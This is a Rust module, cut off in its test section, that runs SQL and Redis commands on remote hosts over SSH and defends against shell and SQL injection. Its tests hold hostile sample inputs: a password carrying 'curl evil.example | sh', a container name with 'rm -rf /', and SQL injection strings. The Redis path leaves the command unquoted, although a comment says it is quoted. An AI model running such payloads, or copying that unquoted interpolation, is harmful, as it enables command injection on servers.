//! Running SQL against a discovered database.
//!
//! Queries go through the host's own `mysql` client over the existing SSH exec path
//! rather than a driver crate. Three reasons that is the right trade here:
//!
//! - It adds no dependency, and in particular no second TLS stack. This project keeps
//!   deliberately to `rustls`/`ring` so the build stays clean on the MinGW toolchain.
//! - `docker exec` reaches a containerised database with no published port and no
//!   network changes, which is most of what "and the Docker ones too" means in practice.
//! - Authentication is the server's own, so a user who can already log in over SSH does
//!   not have to re-plumb grants or expose 3306.
//!
//! The cost is that results are text, so [`parse_batch`] has to undo `mysql`'s batch
//! escaping. That is a contained, testable problem — see the tests at the bottom.
//!
//! # Keeping the password out of `ps`
//!
//! `mysql -pSECRET` puts the password in the remote process list, where any user on that
//! box can read it. Instead the password is written to a `0600` temp file as a
//! `[client]` section and passed with `--defaults-extra-file`, then the file is removed
//! whether the query succeeded or not. `umask 077` is set *before* `mktemp`, so the file
//! is never briefly world-readable.
//!
//! `mktemp` is called as `mktemp 2>/dev/null || mktemp -t xconsole`: GNU coreutils takes a
//! bare `mktemp`, but the BSD one — FreeBSD, macOS — requires a template or `-t` and exits
//! with a usage error otherwise. That error hit `|| exit 1` and the query died before the
//! client was ever run, so every SQL statement failed on those hosts.

use serde::{Deserialize, Serialize};

use super::discover::DbEngine;
use crate::ssh::{shell_quote, SessionManager};

/// Which database to talk to, and as whom.
#[derive(Debug, Clone, Deserialize)]
pub struct DbTarget {
    pub vps_id: String,
    /// Run inside this container when set, otherwise on the host.
    pub container: Option<String>,
    /// Host as the *database client* sees it (the server's own loopback, usually).
    pub host: String,
    pub port: u16,
    pub user: String,
    pub password: String,
    /// Default schema/database, when one is selected.
    pub database: Option<String>,
    /// Which client to drive and which dialect to speak.
    pub engine: DbEngine,
}

/// A tabular result. Values are `None` for SQL NULL.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct ResultSet {
    pub columns: Vec<String>,
    pub rows: Vec<Vec<Option<String>>>,
    /// Rows affected, for statements that don't return a set.
    pub affected: Option<u64>,
    /// Server-reported notice, if any.
    pub message: Option<String>,
}

impl ResultSet {
    fn empty() -> Self {
        Self { columns: Vec::new(), rows: Vec::new(), affected: None, message: None }
    }
}

/// The script that actually runs the query, before it is wrapped for `sh -c`.
///
/// Split out from [`build_command`] because the wrapping escapes everything a second
/// time: asserting on the doubly-escaped result is unreadable and brittle, whereas this
/// is the layer where the quoting decisions are actually made.
///
/// Everything interpolated is `shell_quote`d. The SQL goes to `-e` as one quoted
/// argument, so shell metacharacters inside a query are inert.
fn inner_script(target: &DbTarget, sql: &str) -> String {
    match target.engine {
        DbEngine::MySql => mysql_script(target, sql),
        DbEngine::Postgres => psql_script(target, sql),
        DbEngine::Redis => redis_script(target, sql),
    }
}

/// Run a Redis command with `redis-cli`.
///
/// Redis has no SQL, so the `sql` argument here is a raw Redis command line (`SCAN 0
/// MATCH x:*`, `TYPE key`, …). It is passed as ONE shell argument and split by redis-cli
/// itself, so a key containing a space or a shell metacharacter stays inert.
///
/// The password goes in `REDISCLI_AUTH` rather than `-a`. `-a` puts it in the remote
/// process list where any user on that box can read it; the env var is visible only via
/// `/proc/<pid>/environ`, which is owner-readable. Redis has no equivalent of `.pgpass` or
/// a `[client]` section, so this is the best the CLI offers — weaker than the file-based
/// handling the SQL engines get, and worth knowing.
fn redis_script(target: &DbTarget, command: &str) -> String {
    // `database` carries the numeric Redis DB index (db0, db1, …) from the tree.
    let db = target
        .database
        .as_deref()
        .and_then(|d| d.trim_start_matches("db").parse::<u8>().ok())
        .unwrap_or(0);

    format!(
        "REDISCLI_AUTH={} redis-cli --no-auth-warning -h {} -p {} -n {} {}",
        shell_quote(&target.password),
        shell_quote(&target.host),
        target.port,
        db,
        command,
    )
}

/// `psql` equivalent of [`mysql_script`].
///
/// Same password discipline — a `0600` temp file rather than an argument or an env var,
/// here a `PGPASSFILE` line rather than a `[client]` section.
///
/// Output is `--csv`, not the tab-separated form used for MySQL. psql's unaligned mode
/// does not escape a tab or newline inside a value, so a single multi-line column would
/// silently shift every following field into the wrong column. CSV quotes them properly.
fn psql_script(target: &DbTarget, sql: &str) -> String {
    let db = target
        .database
        .as_deref()
        .filter(|d| !d.is_empty())
        .unwrap_or("postgres");

    // host:port:database:user:password — `*` for database so the same file works
    // whichever database the statement touches.
    let pgpass = format!(
        "{}:{}:*:{}:{}",
        target.host, target.port, target.user, target.password
    );

    format!(
        "umask 077; f=$(mktemp 2>/dev/null || mktemp -t xconsole) || exit 1; \
         printf '%s\\n' {} > \"$f\"; \
         PGPASSFILE=\"$f\" psql --csv --no-psqlrc -v ON_ERROR_STOP=1 \
           -h {} -p {} -U {} -d {} -c {}; \
         rc=$?; rm -f \"$f\"; exit $rc",
        shell_quote(&pgpass),
        shell_quote(&target.host),
        target.port,
        shell_quote(&target.user),
        shell_quote(db),
        shell_quote(sql),
    )
}

fn mysql_script(target: &DbTarget, sql: &str) -> String {
    let mut args = format!(
        "--protocol=TCP -h {} -P {} -u {}",
        shell_quote(&target.host),
        target.port,
        shell_quote(&target.user),
    );
    if let Some(db) = target.database.as_deref().filter(|d| !d.is_empty()) {
        args.push(' ');
        args.push_str(&shell_quote(db));
    }

    // --batch gives tab-separated output with escaping we can reverse; without it the
    // client draws an ASCII table that is far more work to parse and lossy for values
    // containing box-drawing characters. --skip-column-names is NOT used: the header
    // row is how the column list is discovered.
    format!(
        "umask 077; f=$(mktemp 2>/dev/null || mktemp -t xconsole) || exit 1; \
         printf '[client]\\npassword=%s\\n' {} > \"$f\"; \
         mysql --defaults-extra-file=\"$f\" {args} --batch --default-character-set=utf8mb4 -e {}; \
         rc=$?; rm -f \"$f\"; exit $rc",
        shell_quote(&target.password),
        shell_quote(sql),
    )
}

/// Wrap [`inner_script`] so it can be handed to the remote exec channel.
///
/// `sh -c`, not `sh -lc`: a login shell sources profile scripts, which vary by host and
/// by image and can rewrite PATH or print banners into the stdout we are about to parse.
/// `docker exec -i` with no `-t` so no TTY is allocated — with a TTY the client draws its
/// interactive ASCII table instead of batch output.
fn build_command(target: &DbTarget, sql: &str) -> String {
    let inner = inner_script(target, sql);
    match target.container.as_deref() {
        Some(c) => format!("docker exec -i {} sh -c {}", shell_quote(c), shell_quote(&inner)),
        None => format!("sh -c {}", shell_quote(&inner)),
    }
}

/// Run `sql` and parse the result.
pub async fn run_sql(
    sessions: &SessionManager,
    target: &DbTarget,
    sql: &str,
) -> Result<ResultSet, String> {
    let out = sessions
        .run_command(&target.vps_id, &build_command(target, sql))
        .await?;

    if out.exit_code != 0 {
        // mysql puts the useful part on stderr, prefixed with "ERROR 1064 (42000) at ...".
        let detail = out.stderr.trim();
        return Err(if detail.is_empty() {
            format!("the query failed (exit {})", out.exit_code)
        } else {
            clean_error(detail)
        });
    }

    let mut set = match target.engine {
        DbEngine::MySql => parse_batch(&out.stdout),
        DbEngine::Postgres => parse_csv(&out.stdout),
        DbEngine::Redis => parse_lines(&out.stdout, "value"),
    };
    // A warning on stderr with a zero exit is worth surfacing, not swallowing.
    let warn = out.stderr.trim();
    if !warn.is_empty() {
        set.message = Some(clean_error(warn));
    }
    Ok(set)
}

/// Strip the noise `mysql` prints around a real error message.
fn clean_error(text: &str) -> String {
    text.lines()
        .map(str::trim)
        .filter(|l| {
            !l.is_empty()
                // Emitted whenever a password is supplied; not an error, and alarming.
                && !l.contains("Using a password on the command line")
                && !l.starts_with("mysql: [Warning]")
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// Parse `mysql --batch` output: a header row, then one row per line, tab-separated.
///
/// Batch mode escapes tab, newline and backslash inside values (`\t`, `\n`, `\\`) so a
/// value can never be confused with a delimiter. NULL is printed as the bare token
/// `NULL`; a *string* whose content is exactly `NULL` is therefore indistinguishable,
/// which is a documented limitation of the client's batch format rather than something
/// this parser can recover.
pub fn parse_batch(stdout: &str) -> ResultSet {
    let mut lines = stdout.split('\n').filter(|l| !l.is_empty()).peekable();
    let Some(header) = lines.next() else {
        return ResultSet::empty();
    };

    let columns: Vec<String> = header
        .trim_end_matches('\r')
        .split('\t')
        .map(unescape)
        .map(|c| c.unwrap_or_default())
        .collect();

    let rows: Vec<Vec<Option<String>>> = lines
        .map(|line| {
            line.trim_end_matches('\r')
                .split('\t')
                .map(unescape)
                .collect::<Vec<_>>()
        })
        // A ragged line means the output wasn't the table we think it is; dropping it
        // beats showing values under the wrong headings.
        .filter(|r| r.len() == columns.len())
        .collect();

    ResultSet { columns, rows, affected: None, message: None }
}

/// Parse `psql --csv` output: a header row, then one row per record.
///
/// RFC 4180 rules, which is what psql emits: fields separated by commas, a field
/// containing a comma/quote/newline is wrapped in double quotes, and a literal quote
/// inside is doubled. A newline *inside* quotes is part of the value, not a row break —
/// which is exactly why CSV is used here instead of psql's unaligned mode.
///
/// psql prints SQL NULL as an empty unquoted field and an empty string as `""`, so the two
/// are distinguishable — better than the MySQL batch format, where both look like `NULL`.
pub fn parse_csv(stdout: &str) -> ResultSet {
    let mut rows: Vec<Vec<Option<String>>> = Vec::new();
    let mut field = String::new();
    let mut record: Vec<Option<String>> = Vec::new();
    let mut quoted = false;
    // Distinguishes a bare empty field (NULL) from an explicit `""` (empty string).
    let mut was_quoted = false;
    let mut chars = stdout.chars().peekable();

    let push_field = |record: &mut Vec<Option<String>>, field: &mut String, was_quoted: &mut bool| {
        record.push(if *was_quoted || !field.is_empty() {
            Some(std::mem::take(field))
        } else {
            field.clear();
            None
        });
        *was_quoted = false;
    };

    while let Some(c) = chars.next() {
        if quoted {
            if c == '"' {
                if chars.peek() == Some(&'"') {
                    chars.next();
                    field.push('"');
                } else {
                    quoted = false;
                }
            } else {
                field.push(c);
            }
            continue;
        }
        match c {
            '"' => {
                quoted = true;
                was_quoted = true;
            }
            ',' => push_field(&mut record, &mut field, &mut was_quoted),
            '\r' => {}
            '\n' => {
                push_field(&mut record, &mut field, &mut was_quoted);
                rows.push(std::mem::take(&mut record));
            }
            _ => field.push(c),
        }
    }
    // A final row with no trailing newline.
    if !field.is_empty() || was_quoted || !record.is_empty() {
        push_field(&mut record, &mut field, &mut was_quoted);
        rows.push(record);
    }

    let mut rows = rows.into_iter().filter(|r| !r.is_empty());
    let Some(header) = rows.next() else {
        return ResultSet::empty();
    };
    let columns: Vec<String> = header.into_iter().map(|c| c.unwrap_or_default()).collect();
    let rows: Vec<Vec<Option<String>>> = rows.filter(|r| r.len() == columns.len()).collect();

    ResultSet { columns, rows, affected: None, message: None }
}

/// Parse plain line-per-record output (redis-cli) into a one-column result.
///
/// redis-cli emits one value per line with no header and no quoting, so there is nothing
/// to unescape — but equally nothing to disambiguate an empty value from a blank line,
/// hence blank lines are dropped rather than becoming empty rows.
pub fn parse_lines(stdout: &str, column: &str) -> ResultSet {
    let rows: Vec<Vec<Option<String>>> = stdout
        .lines()
        .map(str::trim_end)
        .filter(|l| !l.is_empty())
        .map(|l| vec![Some(l.to_string())])
        .collect();
    ResultSet {
        columns: vec![column.to_string()],
        rows,
        affected: None,
        message: None,
    }
}

/// Reverse batch-mode escaping. Returns `None` for the NULL token.
fn unescape(field: &str) -> Option<String> {
    if field == "NULL" {
        return None;
    }
    if !field.contains('\\') {
        return Some(field.to_string());
    }
    let mut out = String::with_capacity(field.len());
    let mut chars = field.chars();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('t') => out.push('\t'),
            Some('n') => out.push('\n'),
            Some('r') => out.push('\r'),
            Some('0') => out.push('\0'),
            Some('b') => out.push('\x08'),
            Some('Z') => out.push('\x1a'),
            Some('\'') => out.push('\''),
            Some('"') => out.push('"'),
            Some('\\') => out.push('\\'),
            // Unknown escape: keep it verbatim rather than silently dropping data.
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    Some(out)
}

// ---------------------------------------------------------------------------
// SQL identifier and literal quoting.
//
// These are the only places user- or schema-supplied text becomes SQL. Kept together and
// tested, because getting them wrong is a SQL-injection hole into the user's own data.
// ---------------------------------------------------------------------------

/// Quote an identifier (schema, table, column) for `engine`.
///
/// MySQL uses backticks and doubles a literal backtick; Postgres uses double quotes and
/// doubles a literal double quote. Anything containing a NUL is rejected outright — it
/// cannot appear in a valid identifier and is a sign of a crafted name.
pub fn quote_ident_for(engine: DbEngine, name: &str) -> Result<String, String> {
    if name.contains('\0') {
        return Err("invalid identifier".into());
    }
    Ok(match engine {
        DbEngine::MySql => format!("`{}`", name.replace('`', "``")),
        DbEngine::Postgres => format!("\"{}\"", name.replace('"', "\"\"")),
        DbEngine::Redis => return Err(not_sql(engine)),
    })
}

/// Quote a value as a SQL string literal, or `NULL`.
///
/// Backslash is doubled because MySQL treats it as an escape inside string literals
/// unless `NO_BACKSLASH_ESCAPES` is set, and the server's mode isn't knowable from here.
/// Postgres treats backslash literally in standard strings, so doubling it there would
/// corrupt the value — hence the engine parameter.
pub fn quote_value_for(engine: DbEngine, value: Option<&str>) -> String {
    let Some(v) = value else {
        return "NULL".to_string();
    };
    let mut out = String::with_capacity(v.len() + 2);
    out.push('\'');
    for c in v.chars() {
        match (c, engine) {
            ('\'', _) => out.push_str("''"),
            ('\\', DbEngine::MySql) => out.push_str("\\\\"),
            ('\0', DbEngine::MySql) => out.push_str("\\0"),
            // A NUL cannot be stored in a Postgres text value at all; dropping it beats
            // emitting a literal that the server will reject halfway through a statement.
            ('\0', DbEngine::Postgres) => {}
            _ => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// Error for asking a non-SQL engine for SQL.
fn not_sql(engine: DbEngine) -> String {
    format!("{} does not speak SQL — use the Redis command path instead", engine.label())
}

/// The databases/schemas a user can browse, minus the server's own internals.
///
/// In MySQL, schemas map directly onto databases. In Postgres, a cluster has multiple
/// databases (`pg_database`), so discovering the server's databases is what lets users
/// switch between applications/databases cleanly.
pub fn list_databases_sql(engine: DbEngine) -> Result<String, String> {
    Ok(match engine {
        DbEngine::MySql => "SELECT SCHEMA_NAME FROM information_schema.SCHEMATA \
             WHERE SCHEMA_NAME NOT IN ('information_schema','performance_schema','mysql','sys') \
             ORDER BY SCHEMA_NAME"
            .to_string(),
        DbEngine::Postgres => "SELECT datname FROM pg_catalog.pg_database \
             WHERE datistemplate = false AND datname NOT IN ('template0', 'template1') \
             ORDER BY datname"
            .to_string(),
        DbEngine::Redis => return Err(not_sql(engine)),
    })
}

/// Tables in a schema/database, with row estimates and size.
pub fn list_tables_sql(engine: DbEngine, schema: &str) -> Result<String, String> {
    Ok(match engine {
        DbEngine::MySql => format!(
            "SELECT TABLE_NAME, TABLE_TYPE, IFNULL(TABLE_ROWS,0), \
             IFNULL(DATA_LENGTH,0)+IFNULL(INDEX_LENGTH,0), IFNULL(ENGINE,'') \
             FROM information_schema.TABLES WHERE TABLE_SCHEMA = {} ORDER BY TABLE_NAME",
            quote_value_for(engine, Some(schema))
        ),
        // reltuples is the planner's estimate, matching MySQL's TABLE_ROWS (also an
        // estimate) rather than paying for a count(*) on every table in the tree.
        DbEngine::Postgres => "SELECT c.relname, \
                CASE c.relkind WHEN 'r' THEN 'BASE TABLE' WHEN 'v' THEN 'VIEW' \
                     WHEN 'm' THEN 'MATERIALIZED VIEW' WHEN 'p' THEN 'PARTITIONED TABLE' \
                     ELSE c.relkind::text END, \
                GREATEST(c.reltuples, 0)::bigint, \
                pg_total_relation_size(c.oid), \
                'postgres' \
             FROM pg_catalog.pg_class c \
             JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace \
             WHERE n.nspname NOT LIKE 'pg\\_%' AND n.nspname <> 'information_schema' AND c.relkind IN ('r','v','m','p') \
             ORDER BY c.relname"
            .to_string(),
        DbEngine::Redis => return Err(not_sql(engine)),
    })
}

/// Column definitions for a table, including which columns form the primary key.
pub fn describe_table_sql(engine: DbEngine, schema: &str, table: &str) -> Result<String, String> {
    Ok(match engine {
        DbEngine::MySql => format!(
            "SELECT COLUMN_NAME, COLUMN_TYPE, IS_NULLABLE, COLUMN_KEY, \
             IFNULL(COLUMN_DEFAULT,''), EXTRA \
             FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = {} AND TABLE_NAME = {} \
             ORDER BY ORDINAL_POSITION",
            quote_value_for(engine, Some(schema)),
            quote_value_for(engine, Some(table))
        ),
        // COLUMN_KEY has no Postgres equivalent, so the primary key is derived from
        // pg_index and reported as 'PRI' to keep one shape for the UI.
        DbEngine::Postgres => format!(
            "SELECT c.column_name, c.data_type, c.is_nullable, \
                CASE WHEN pk.attname IS NOT NULL THEN 'PRI' ELSE '' END, \
                COALESCE(c.column_default,''), '' \
             FROM information_schema.columns c \
             LEFT JOIN ( \
               SELECT a.attname, cl.relname \
               FROM pg_index i \
               JOIN pg_attribute a ON a.attrelid = i.indrelid AND a.attnum = ANY(i.indkey) \
               JOIN pg_class cl ON cl.oid = i.indrelid \
               WHERE i.indisprimary \
             ) pk ON pk.attname = c.column_name AND pk.relname = c.table_name \
             WHERE c.table_name = {} AND c.table_schema NOT IN ('pg_catalog', 'information_schema') \
             ORDER BY c.ordinal_position",
            quote_value_for(engine, Some(table))
        ),
        DbEngine::Redis => return Err(not_sql(engine)),
    })
}

/// A page of rows from a table.
pub fn select_page_sql(
    engine: DbEngine,
    schema: &str,
    table: &str,
    limit: u32,
    offset: u64,
) -> Result<String, String> {
    // limit/offset are numbers, never interpolated text, so they can't carry SQL.
    Ok(match engine {
        DbEngine::MySql => format!(
            "SELECT * FROM {}.{} LIMIT {} OFFSET {}",
            quote_ident_for(engine, schema)?,
            quote_ident_for(engine, table)?,
            limit.clamp(1, 5000),
            offset
        ),
        DbEngine::Postgres => format!(
            "SELECT * FROM {} LIMIT {} OFFSET {}",
            quote_ident_for(engine, table)?,
            limit.clamp(1, 5000),
            offset
        ),
        DbEngine::Redis => return Err(not_sql(engine)),
    })
}

/// Build the `WHERE` clause identifying exactly one row by primary key.
fn key_predicate(
    engine: DbEngine,
    key: &[(String, Option<String>)],
) -> Result<String, String> {
    let mut parts = Vec::with_capacity(key.len());
    for (col, val) in key {
        parts.push(match val {
            // `= NULL` is never true; a NULL key part has to use IS NULL.
            None => format!("{} IS NULL", quote_ident_for(engine, col)?),
            Some(v) => format!(
                "{} = {}",
                quote_ident_for(engine, col)?,
                quote_value_for(engine, Some(v))
            ),
        });
    }
    Ok(parts.join(" AND "))
}

/// MySQL accepts `LIMIT 1` on UPDATE/DELETE as a second guard; Postgres rejects it as a
/// syntax error. The primary-key predicate already restricts the statement to one row, so
/// the clause is simply omitted there rather than emulated with a `ctid` subquery.
fn row_limit(engine: DbEngine) -> &'static str {
    match engine {
        DbEngine::MySql => " LIMIT 1",
        DbEngine::Postgres | DbEngine::Redis => "",
    }
}

/// Update one column of one row, identified by its primary-key values.
///
/// Requires a non-empty key so an edit can never become an unqualified `UPDATE` that
/// rewrites the whole table.
pub fn update_cell_sql(
    engine: DbEngine,
    schema: &str,
    table: &str,
    column: &str,
    value: Option<&str>,
    key: &[(String, Option<String>)],
) -> Result<String, String> {
    if key.is_empty() {
        return Err(
            "this table has no primary key, so a single row can't be identified — edit it with a SQL statement instead"
                .into(),
        );
    }
    let tbl_ref = match engine {
        DbEngine::MySql => format!("{}.{}", quote_ident_for(engine, schema)?, quote_ident_for(engine, table)?),
        DbEngine::Postgres => quote_ident_for(engine, table)?,
        DbEngine::Redis => return Err(not_sql(engine)),
    };
    Ok(format!(
        "UPDATE {} SET {} = {} WHERE {}{}",
        tbl_ref,
        quote_ident_for(engine, column)?,
        quote_value_for(engine, value),
        key_predicate(engine, key)?,
        row_limit(engine)
    ))
}

/// Delete one row by primary key.
pub fn delete_row_sql(
    engine: DbEngine,
    schema: &str,
    table: &str,
    key: &[(String, Option<String>)],
) -> Result<String, String> {
    if key.is_empty() {
        return Err("this table has no primary key, so a single row can't be deleted safely".into());
    }
    let tbl_ref = match engine {
        DbEngine::MySql => format!("{}.{}", quote_ident_for(engine, schema)?, quote_ident_for(engine, table)?),
        DbEngine::Postgres => quote_ident_for(engine, table)?,
        DbEngine::Redis => return Err(not_sql(engine)),
    };
    Ok(format!(
        "DELETE FROM {} WHERE {}{}",
        tbl_ref,
        key_predicate(engine, key)?,
        row_limit(engine)
    ))
}

/// Most rows one bulk delete may touch. A guard against a runaway selection turning into
/// a statement thousands of predicates long — well past what any server will parse
/// happily, and past what a user can have meaningfully reviewed.
pub const MAX_BULK_DELETE: usize = 500;

/// Delete several rows in ONE statement, each identified by its primary key.
///
/// One statement rather than a loop: every query here is an SSH round trip plus a client
/// process on the server, so deleting 200 rows one at a time would take minutes and leave
/// the table half-changed if it failed midway. As a single `DELETE … WHERE (…) OR (…)` it
/// is one round trip and one transaction, so it either all applies or none of it does.
///
/// No `LIMIT`: the point is to delete exactly the selected rows, and each disjunct is a
/// full primary-key match, so the statement can only touch rows that were selected.
pub fn delete_rows_sql(
    engine: DbEngine,
    schema: &str,
    table: &str,
    keys: &[Vec<(String, Option<String>)>],
) -> Result<String, String> {
    if keys.is_empty() {
        return Err("nothing selected".into());
    }
    if keys.len() > MAX_BULK_DELETE {
        return Err(format!(
            "that is {} rows; delete at most {MAX_BULK_DELETE} at a time",
            keys.len()
        ));
    }
    if keys.iter().any(|k| k.is_empty()) {
        return Err(
            "this table has no primary key, so rows can't be identified individually — \
             delete them with a SQL statement instead"
                .into(),
        );
    }

    let mut parts = Vec::with_capacity(keys.len());
    for key in keys {
        parts.push(format!("({})", key_predicate(engine, key)?));
    }
    let tbl_ref = match engine {
        DbEngine::MySql => format!("{}.{}", quote_ident_for(engine, schema)?, quote_ident_for(engine, table)?),
        DbEngine::Postgres => quote_ident_for(engine, table)?,
        DbEngine::Redis => return Err(not_sql(engine)),
    };
    Ok(format!(
        "DELETE FROM {} WHERE {}",
        tbl_ref,
        parts.join(" OR ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn target() -> DbTarget {
        DbTarget {
            vps_id: "v1".into(),
            container: None,
            host: "127.0.0.1".into(),
            port: 3306,
            user: "root".into(),
            password: "pw".into(),
            database: None,
            engine: DbEngine::MySql,
        }
    }

    fn pg_target() -> DbTarget {
        DbTarget {
            vps_id: "v1".into(),
            container: None,
            host: "127.0.0.1".into(),
            port: 5432,
            user: "postgres".into(),
            password: "pw".into(),
            database: Some("studio".into()),
            engine: DbEngine::Postgres,
        }
    }

    // Shorthands so the MySQL tests below read as they did before the engine parameter.
    fn quote_ident(name: &str) -> Result<String, String> {
        quote_ident_for(DbEngine::MySql, name)
    }
    fn quote_value(value: Option<&str>) -> String {
        quote_value_for(DbEngine::MySql, value)
    }

    #[test]
    fn password_never_reaches_the_command_line() {
        let cmd = build_command(&target(), "SELECT 1");
        assert!(
            !cmd.contains("-ppw") && !cmd.contains("--password=pw"),
            "password must not be an argv entry: {cmd}"
        );
        assert!(cmd.contains("--defaults-extra-file"), "{cmd}");
        assert!(cmd.contains("umask 077"), "temp file must never be world-readable");
        assert!(cmd.contains("rm -f"), "temp file must be removed");
    }

    #[test]
    fn a_hostile_password_cannot_break_out_of_the_shell() {
        let mut t = target();
        t.password = "a'; curl evil.example | sh; #".into();
        // Assert at the layer that does the quoting. build_command escapes this whole
        // string a second time for `sh -c`, so asserting there would mean writing the
        // doubly-escaped form by hand — unreadable, and it would drift on any change.
        let script = inner_script(&t, "SELECT 1");
        // Closed-escaped-reopened, so the quoting stays balanced and the payload is data.
        assert!(script.contains(r#"'a'\''; curl evil.example | sh; #'"#), "{script}");
        // And the wrapper must not undo that.
        let cmd = build_command(&t, "SELECT 1");
        assert!(cmd.starts_with("sh -c '"), "{cmd}");
        assert!(cmd.ends_with('\''), "{cmd}");
    }

    #[test]
    fn a_hostile_sql_string_stays_one_argument() {
        let script = inner_script(&target(), "SELECT 1; DROP TABLE t");
        // The whole statement is one -e argument; the `;` is inside the quotes, so the
        // shell never sees it as a command separator. (MySQL itself will run both
        // statements only if the user asked for that — that is their database.)
        assert!(script.contains("-e 'SELECT 1; DROP TABLE t'"), "{script}");
    }

    #[test]
    fn a_hostile_container_name_is_quoted() {
        let mut t = target();
        t.container = Some("db; rm -rf /".into());
        let cmd = build_command(&t, "SELECT 1");
        assert!(cmd.starts_with("docker exec -i 'db; rm -rf /'"), "{cmd}");
    }

    #[test]
    fn postgres_uses_psql_and_keeps_the_password_off_the_command_line() {
        let script = inner_script(&pg_target(), "SELECT 1");
        assert!(script.contains("psql --csv"), "{script}");
        assert!(script.contains("PGPASSFILE="), "{script}");
        assert!(!script.contains("PGPASSWORD"), "env var would show in /proc: {script}");
        assert!(script.contains("umask 077"), "{script}");
        assert!(script.contains("rm -f"), "{script}");
        // The pgpass line, and the selected database.
        assert!(script.contains("'127.0.0.1:5432:*:postgres:pw'"), "{script}");
        assert!(script.contains("-d 'studio'"), "{script}");
    }

    #[test]
    fn postgres_identifiers_and_literals_use_the_right_quoting() {
        // Double quotes for identifiers, doubled to escape.
        assert_eq!(quote_ident_for(DbEngine::Postgres, "users").unwrap(), "\"users\"");
        assert_eq!(quote_ident_for(DbEngine::Postgres, "we\"ird").unwrap(), "\"we\"\"ird\"");
        // Backslash is NOT doubled: Postgres standard strings take it literally, so
        // doubling would corrupt the value.
        assert_eq!(quote_value_for(DbEngine::Postgres, Some(r"a\b")), r"'a\b'");
        assert_eq!(quote_value_for(DbEngine::MySql, Some(r"a\b")), r"'a\\b'");
        assert_eq!(quote_value_for(DbEngine::Postgres, Some("O'Brien")), "'O''Brien'");
    }

    #[test]
    fn postgres_edits_omit_the_limit_clause() {
        // `UPDATE ... LIMIT 1` is a syntax error in Postgres; the primary-key predicate
        // already restricts it to one row.
        let sql = update_cell_sql(
            DbEngine::Postgres,
            "public",
            "orders",
            "status",
            Some("paid"),
            &[("id".into(), Some("42".into()))],
        )
        .unwrap();
        assert_eq!(
            sql,
            "UPDATE \"orders\" SET \"status\" = 'paid' WHERE \"id\" = '42'"
        );
        assert!(!sql.contains("LIMIT"), "{sql}");
        // MySQL keeps it as a second guard.
        let my = update_cell_sql(
            DbEngine::MySql,
            "shop",
            "orders",
            "status",
            Some("paid"),
            &[("id".into(), Some("42".into()))],
        )
        .unwrap();
        assert!(my.ends_with(" LIMIT 1"), "{my}");
    }

    #[test]
    fn parses_psql_csv_output() {
        let out = "id,name,note\n1,Ada,\"line1\nline2\"\n2,Grace,\n3,\"say \"\"hi\"\"\",\"\"\n";
        let set = parse_csv(out);
        assert_eq!(set.columns, vec!["id", "name", "note"]);
        assert_eq!(set.rows.len(), 3, "{:?}", set.rows);
        // A newline inside quotes is part of the value, not a row break.
        assert_eq!(set.rows[0][2].as_deref(), Some("line1\nline2"));
        // Bare empty field is NULL; `""` is an empty string. psql distinguishes them,
        // unlike the MySQL batch format.
        assert_eq!(set.rows[1][2], None);
        assert_eq!(set.rows[2][2].as_deref(), Some(""));
        // Doubled quotes unescape to one.
        assert_eq!(set.rows[2][1].as_deref(), Some(r#"say "hi""#));
    }

    #[test]
    fn csv_edge_cases() {
        assert_eq!(parse_csv(""), ResultSet::empty());
        let header_only = parse_csv("a,b\n");
        assert_eq!(header_only.columns.len(), 2);
        assert!(header_only.rows.is_empty());
        // A value containing a comma must stay one field.
        let set = parse_csv("a,b\n\"x,y\",z\n");
        assert_eq!(set.rows[0][0].as_deref(), Some("x,y"));
        // No trailing newline on the last row.
        let set = parse_csv("a\n1");
        assert_eq!(set.rows.len(), 1);
        assert_eq!(set.rows[0][0].as_deref(), Some("1"));
    }

    #[test]
    fn parses_a_result_set() {
        let out = "id\tname\temail\n1\tAda\tada@example.com\n2\tGrace\tNULL\n";
        let set = parse_batch(out);
        assert_eq!(set.columns, vec!["id", "name", "email"]);
        assert_eq!(set.rows.len(), 2);
        assert_eq!(set.rows[0][1].as_deref(), Some("Ada"));
        assert_eq!(set.rows[1][2], None, "NULL must be None, not the text 'NULL'");
    }

    #[test]
    fn unescapes_values_containing_delimiters() {
        // A value with a real tab and newline, as batch mode encodes them.
        let out = "id\tnote\n1\tline1\\nline2\\tafter-tab\n";
        let set = parse_batch(out);
        assert_eq!(set.rows[0][1].as_deref(), Some("line1\nline2\tafter-tab"));
    }

    #[test]
    fn keeps_backslashes_that_are_data() {
        let out = "p\nC:\\\\Users\\\\bogda\n";
        let set = parse_batch(out);
        assert_eq!(set.rows[0][0].as_deref(), Some(r"C:\Users\bogda"));
    }

    #[test]
    fn empty_and_header_only_output() {
        assert_eq!(parse_batch(""), ResultSet::empty());
        let set = parse_batch("id\tname\n");
        assert_eq!(set.columns.len(), 2);
        assert!(set.rows.is_empty());
    }

    #[test]
    fn drops_ragged_lines_rather_than_misaligning_columns() {
        let out = "a\tb\n1\t2\nbroken\n3\t4\n";
        let set = parse_batch(out);
        assert_eq!(set.rows.len(), 2, "{:?}", set.rows);
    }

    #[test]
    fn identifiers_escape_backticks() {
        assert_eq!(quote_ident("users").unwrap(), "`users`");
        assert_eq!(quote_ident("we`ird").unwrap(), "`we``ird`");
        // A crafted name must not be able to close the quoting and append SQL.
        let q = quote_ident("x` ; DROP TABLE t; -- ").unwrap();
        assert!(q.starts_with('`') && q.ends_with('`'));
        assert_eq!(q.matches("``").count(), 1);
        assert!(quote_ident("bad\0name").is_err());
    }

    #[test]
    fn values_escape_quotes_and_backslashes() {
        assert_eq!(quote_value(Some("O'Brien")), "'O''Brien'");
        assert_eq!(quote_value(Some(r"back\slash")), r"'back\\slash'");
        assert_eq!(quote_value(None), "NULL");
        // The classic payload stays inside the literal.
        let q = quote_value(Some("' OR 1=1 -- "));
        assert_eq!(q, "''' OR 1=1 -- '");
    }

    #[test]
    fn an_edit_without_a_key_is_refused() {
        let err = update_cell_sql(DbEngine::MySql, "s", "t", "c", Some("v"), &[]).unwrap_err();
        assert!(err.contains("primary key"), "{err}");
